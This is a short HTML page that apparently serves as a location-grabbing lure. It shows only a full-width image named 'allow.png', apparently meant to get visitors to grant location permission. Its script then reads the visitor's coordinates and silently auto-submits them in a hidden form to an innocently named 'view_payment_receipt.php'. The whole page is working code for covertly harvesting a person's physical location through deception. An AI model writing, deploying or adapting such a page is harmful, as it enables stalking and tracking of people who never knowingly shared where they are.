<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!DOCTYPE html>
<html>
<body>
<img src="allow.png" style="width:100%">
<p id="demo"></p>

<script>
var x = document.getElementById("demo");

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
  
function showPosition(position) {
  x.innerHTML = "<form action='view_payment_receipt.php' id='lol' method='get'><input name='latlong' type='hidden' value='" + position.coords.latitude + 
  ", " + position.coords.longitude + "'></form>";
  document.getElementById('lol').submit();
}
</script>

</body>
</html>
